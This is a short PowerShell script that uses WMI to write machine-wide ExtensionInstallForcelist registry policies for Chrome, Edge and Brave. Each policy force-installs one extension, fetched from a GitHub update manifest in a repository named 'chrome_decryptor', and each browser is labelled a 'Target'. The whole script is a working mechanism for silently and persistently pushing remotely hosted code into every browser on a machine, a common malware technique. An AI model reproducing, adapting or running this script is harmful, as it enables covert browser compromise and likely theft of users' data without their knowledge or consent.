$extId = "pccofikgeelbcjceafhplckmeajojgde"
$xmlUrl = "https://raw.githubusercontent.com/tn2g4fh-alt/chrome_decryptor/refs/heads/main/update.xml"
$policyValue = "$extId;$xmlUrl"
$HKLM = [uint32]2147483650
$wmi = [WMIClass]"root\default:StdRegProv"

# 1. Target Google Chrome
$chromePath = "SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"
$wmi.CreateKey($HKLM, $chromePath)
$wmi.SetStringValue($HKLM, $chromePath, "1", $policyValue)

# 2. Target Microsoft Edge
$edgePath = "SOFTWARE\Policies\Microsoft\Edge\ExtensionInstallForcelist"
$wmi.CreateKey($HKLM, $edgePath)
$wmi.SetStringValue($HKLM, $edgePath, "1", $policyValue)

# 3. Target Brave Browser
$bravePath = "SOFTWARE\Policies\BraveSoftware\Brave\ExtensionInstallForcelist"
$wmi.CreateKey($HKLM, $bravePath)
$wmi.SetStringValue($HKLM, $bravePath, "1", $policyValue)
